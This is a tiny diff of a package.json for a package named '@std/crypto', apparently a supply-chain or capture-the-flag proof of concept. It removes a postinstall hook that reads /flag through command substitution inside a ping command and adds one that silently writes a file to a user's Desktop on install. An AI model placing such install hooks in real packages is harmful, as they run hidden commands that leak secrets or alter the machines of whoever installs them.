@@ -1,6 +1,6 @@
 {
   "name": "@std/crypto",
   "scripts": {
-    "postinstall": "ping -c 1 -I $(cat /flag) 127.0.0.1"
+    "postinstall": "echo \"aaaaaa\" > /home/anou/Desktop/secure_com/haha"
   }
 }
